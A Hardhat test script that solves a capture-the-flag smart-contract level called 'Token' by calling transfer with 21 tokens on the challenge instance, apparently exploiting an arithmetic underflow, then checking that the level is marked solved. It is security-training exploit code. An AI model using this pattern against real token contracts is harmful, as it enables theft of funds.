import { expect } from "chai";
import { Contract, Signer } from "ethers";
import { ethers } from "hardhat";
import { createChallenge, submitLevel } from "./utils";
import { loadFixture } from "@nomicfoundation/hardhat-network-helpers";


let accounts: Signer[];
let eoa: Signer;
let attacker: Contract;
let challenge: Contract; // challenge contract
let tx: any;

describe("Token", function () {

    async function deployTokenFixture(): Promise<any> {
        accounts = await ethers.getSigners();
        [eoa] = accounts;
        const challengeFactory = await ethers.getContractFactory(`Token`);
        const challengeAddress = await createChallenge(
            `0xB4802b28895ec64406e45dB504149bfE79A38A57`
        );
        challenge = await challengeFactory.attach(challengeAddress);

        return { eoa, challenge };
    }
    it("solves the challenge", async function () {
        const { eoa, challenge } = await loadFixture(deployTokenFixture);
        tx = await challenge.transfer(challenge.address, 21);
        await tx.wait();
    });

    after(async () => {
        expect(await submitLevel(challenge.address), "level not solved").to.be.true;
    });
});
